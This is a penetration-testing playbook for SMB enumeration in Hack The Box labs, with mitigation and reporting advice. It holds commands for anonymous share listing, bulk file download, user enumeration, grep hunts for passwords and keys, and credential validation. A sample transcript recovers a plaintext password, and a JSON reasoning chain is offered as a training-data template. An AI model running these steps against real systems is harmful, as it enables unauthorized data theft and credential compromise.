# SMB Machine Enumeration (HTB Detailed Playbook)

Use this only in authorized labs such as Hack The Box.

---

## 1. Goal

When SMB (139/445) is open, your objective is to:
- identify accessible shares,
- check if anonymous or passwordless access is possible,
- discover useful files (credentials, configs, scripts, backups),
- build escalation and lateral movement hypotheses.

---

## 2. First Check: Is SMB Exposed?

```bash
nmap -p 139,445 -sV --script smb-os-discovery,smb2-security-mode <TARGET_IP>
```

What this gives you:
- OS/domain/workgroup hints
- SMB version
- signing mode (important for relay hypothesis)

If 445 is open, continue immediately with share enumeration.

---

## 3. List Available Shares (Anonymous / Passwordless)

### 3.1 smbclient null session

```bash
smbclient -L //<TARGET_IP> -N
```

- -L: list shares
- -N: no password prompt (anonymous/null attempt)

If this works, you likely have passwordless visibility.

### 3.2 Alternative with credentials if needed

```bash
smbclient -L //<TARGET_IP> -U <USER>
smbclient -L //<TARGET_IP> -U '<DOMAIN>\<USER>%<PASSWORD>'
```

---

## 4. Connect to a Share with smbclient

If you see shares like Public, Users, Backup, NETLOGON, SYSVOL, try each one.

```bash
smbclient //<TARGET_IP>/<SHARE> -N
```

With credentials:

```bash
smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>\<USER>%<PASSWORD>'
```

Inside smbclient, useful commands:

```text
help
ls
cd <dir>
pwd
get <file>
mget *
recurse on
prompt off
```

Practical download workflow:

```text
recurse on
prompt off
mask ""
mget *
```

This pulls everything you can read from that share.

---

## 5. Fast Share Permission Triage

Use smbmap to quickly see readable/writable shares.

```bash
smbmap -H <TARGET_IP>
smbmap -H <TARGET_IP> -u <USER> -p <PASSWORD>
smbmap -H <TARGET_IP> -u <USER> -p <PASSWORD> -R
```

What you care about:
- READ access: data leak potential
- WRITE access: possible code execution or persistence paths

---

## 6. Enumerate More Context (Users/Groups/Policy)

Null/RPC enumeration can reveal account structure.

```bash
enum4linux -a <TARGET_IP>
enum4linux-ng -A <TARGET_IP>
rpcclient -U "" -N <TARGET_IP>
```

Inside rpcclient:

```text
enumdomusers
enumdomgroups
querydominfo
getdompwinfo
```

This helps identify likely admin/service accounts and password policy strength.

---

## 7. How to Find Passwordless Files and Sensitive Data

After downloading share content, search locally:

```bash
# high-value filenames
find . -type f \( \
	-iname "*pass*" -o -iname "*cred*" -o -iname "*secret*" -o \
	-iname "*.kdbx" -o -iname "*.config" -o -iname "web.config" -o \
	-iname "*.xml" -o -iname "*.ini" -o -iname "*.ps1" -o \
	-iname "*.bat" -o -iname "*.vbs" -o -iname "*.rdp" -o \
	-iname "id_rsa" -o -iname "*.pem" -o -iname "*.pfx" \
\) 2>/dev/null

# keyword hunt in files
grep -RInE "password|passwd|pwd|secret|token|apikey|connection string|username|net use|PRIVATE KEY" . 2>/dev/null
```

Most interesting targets:
- admin scripts and deployment scripts
- backup exports
- IT docs and runbooks
- config files with DB credentials
- remote management scripts using net use, psexec, winrm

---

## 8. Shares That Usually Contain Valuable Data

- SYSVOL: Group Policy artifacts, scripts, domain info
- NETLOGON: login scripts, mapped drives, legacy creds
- Users or Profiles: desktop docs, notes, saved creds
- Backup: database dumps, zipped archives, config snapshots
- Public or IT: operational scripts and infrastructure files

If you find XML in SYSVOL with old Group Policy Preferences artifacts (cpassword), treat as critical.

---

## 9. Lateral Movement Hypotheses from SMB Findings

If you find credentials or writable shares, test these hypotheses in HTB scope:

1. Credential reuse hypothesis:
- credentials from share may work on SMB, WinRM, RDP, SSH, DB, or web admin.

2. Admin share execution hypothesis:
- if you get admin creds, C$, ADMIN$, and remote execution paths become possible.

3. Scripted trust hypothesis:
- logon scripts and automation files can reveal host relationships and privileged account usage.

4. Writable share abuse hypothesis:
- writable startup/logon/deployment path might allow staged payload execution.

---

## 10. Practical End-to-End Command Flow

```bash
# 1) detect SMB
nmap -p 139,445 -sV --script smb-os-discovery,smb2-security-mode <TARGET_IP>

# 2) list shares anonymously
smbclient -L //<TARGET_IP> -N

# 3) inspect share permissions
smbmap -H <TARGET_IP>

# 4) connect to interesting share
smbclient //<TARGET_IP>/<SHARE> -N

# 5) recursively download files from readable share
# (inside smbclient)
# recurse on
# prompt off
# mget *

# 6) local credential and secret triage
grep -RInE "password|secret|token|apikey|PRIVATE KEY" . 2>/dev/null
```

---

## 11. Troubleshooting smbclient

If anonymous fails:

```bash
smbclient -L //<TARGET_IP> -U guest%
smbclient -L //<TARGET_IP> -U <USER>%<PASSWORD>
```

If SMB1/SMB2 negotiation issues appear:

```bash
smbclient -L //<TARGET_IP> -N -m SMB3
smbclient -L //<TARGET_IP> -N -m SMB2
```

If domain auth is required:

```bash
smbclient -L //<TARGET_IP> -U '<DOMAIN>\<USER>%<PASSWORD>'
```

---

## 12. What to Report (Real Assessment)

Minimum evidence:
- accessible shares (anonymous or authenticated)
- permission level per share (read/write)
- sensitive files discovered
- credential artifacts and affected account scope
- likely lateral movement paths enabled by findings

Security impact summary:
- unauthorized data exposure
- credential compromise risk
- potential privilege escalation and lateral movement

---

## 13. Realistic Example Transcript + Analyst Reasoning Chain

Use this section as a model for dataset-style training samples.

## 13. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -p 139,445 -sV --script smb-os-discovery,smb2-security-mode 10.129.55.19
PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Samba smbd 4.6.2
445/tcp open  netbios-ssn  Samba smbd 4.6.2
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.6.2)
|   Computer name: FILESRV
|   Workgroup: WORKGROUP
|_  System time: 2026-04-20T16:11:17+00:00

analyst@kali:~$ smbclient -L //10.129.55.19 -N
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
Public          Disk
Backups         Disk
IPC$            IPC       IPC Service (Samba Server)

analyst@kali:~$ smbmap -H 10.129.55.19
[+] Guest session       IP: 10.129.55.19:445 Name: 10.129.55.19
		Disk                                                    Permissions
		----                                                    -----------
		Public                                                  READ ONLY
		Backups                                                 READ ONLY

analyst@kali:~$ smbclient //10.129.55.19/Public -N
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \notice.txt of size 214 as notice.txt
getting file \it\onboarding.docx of size 17022 as it/onboarding.docx

analyst@kali:~$ smbclient //10.129.55.19/Backups -N
smb: \> ls
	.                                   D        0  Mon Apr 20 13:55:21 2026
	db_backup.sql                       A    28971  Mon Apr 20 13:52:40 2026
	deploy.ps1                          A     1421  Mon Apr 20 13:51:11 2026

analyst@kali:~$ get db_backup.sql
analyst@kali:~$ get deploy.ps1

analyst@kali:~$ grep -RInE "password|user|token|connection string" .
./deploy.ps1:8:$db_user = "svc_backup"
./deploy.ps1:9:$db_pass = "B@ckupService!2025"
./db_backup.sql:14:INSERT INTO users VALUES('admin','<hash>','admin@corp.local');

analyst@kali:~$ crackmapexec smb 10.129.55.19 -u svc_backup -p 'B@ckupService!2025'
SMB         10.129.55.19   445    FILESRV   [+] WORKGROUP\\svc_backup:B@ckupService!2025
```

## 14. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "smb_passwordless_share_exposure",
	"observations": [
		"Port 445 exposed with SMB signing not required",
		"Anonymous listing allowed for Public and Backups shares",
		"Backups share exposed scripts and SQL dump",
		"deploy.ps1 contains plaintext service credential",
		"Recovered credential validates against SMB service"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "discovery",
			"technique": "Network Service Discovery",
			"evidence": "nmap identified SMB service and signing posture",
			"confidence": 0.93
		},
		{
			"step": 2,
			"tactic": "discovery",
			"technique": "File and Directory Discovery",
			"evidence": "Anonymous share enumeration exposed Public/Backups",
			"confidence": 0.9
		},
		{
			"step": 3,
			"tactic": "credential_access",
			"technique": "Unsecured Credentials",
			"evidence": "Plaintext password found in deploy.ps1",
			"confidence": 0.97
		},
		{
			"step": 4,
			"tactic": "lateral_movement",
			"technique": "Valid Accounts",
			"evidence": "Recovered credential authenticated successfully on SMB",
			"confidence": 0.85
		}
	],
	"hypotheses": [
		"Service account password may be reused on WinRM/RDP/DB services",
		"Additional backup artifacts likely contain higher privilege credentials",
		"Signing-not-required posture may enable NTLM relay in larger environments"
	],
	"uncertainties": [
		"Privilege level of svc_backup account beyond SMB is not yet validated",
		"Credential freshness unknown without password-last-set telemetry",
		"Host scope unknown because only one SMB target was tested"
	],
	"recommended_tool_calls": [
		{"name": "smb_recursive_collector", "priority": "high"},
		{"name": "credential_reuse_validator", "priority": "high"},
		{"name": "ad_account_scope_mapper", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Remove anonymous access to all non-public shares",
			"Rotate exposed service credentials",
			"Remove plaintext secrets from scripts and backups"
		],
		"hardening": [
			"Enforce SMB signing required policy",
			"Implement least-privilege ACLs on backup shares",
			"Use vault-backed secret retrieval in deployment automation"
		],
		"monitoring": [
			"Alert on anonymous share enumeration",
			"Detect mass file downloads from backup shares",
			"Monitor authentication with newly rotated service accounts"
		]
	}
}
```

